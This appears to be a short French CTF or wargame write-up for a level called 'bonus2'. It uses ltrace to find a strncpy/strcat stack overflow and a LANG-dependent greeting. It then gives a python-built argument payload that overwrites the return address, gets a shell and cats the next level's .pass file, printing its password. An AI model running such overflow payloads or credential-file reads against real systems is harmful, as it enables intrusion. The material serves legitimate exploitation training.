@@ -1,0 +1,38 @@
+ltrace nous indique qu'un getenv est fait sur LANG (ce qui nous mets la puce a l'oreille pour la suite)
+On tente de passer un puis deux arguments et on a ca:
+
+$> ./bonus2 a b
+Hello a
+
+$> ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+Segmentation fault (core dumped)
+
+$> ltrace ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+__libc_start_main(0x8048529, 3, 0xbffff6f4, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(0xbffff5f0, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 40)                          = 0xbffff5f0
+strncpy(0xbffff618, "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"..., 32)                          = 0xbffff618
+getenv("LANG")                                                                          = "en"
+memcmp(0xbffffea5, 0x804873d, 2, 0xb7fff918, 0)                                         = -1
+memcmp(0xbffffea5, 0x8048740, 2, 0xb7fff918, 0)                                         = -1
+strcat("Hello ", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)                                 = "Hello aaaaaaaaaaaaaaaaaaaaaaaaaa"...
+puts("Hello aaaaaaaaaaaaaaaaaaaaaaaaaa"...Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+)                                             = 79
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+
+
+
+
+
+
+
+
+
+$> ./bonus2 `python -c "print 'A' * 40"` `python -c "print 'B' * 23 + '\xb7\xfe\xff\xbf'"`
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
+$ ls
+ls: cannot open directory .: Permission denied
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
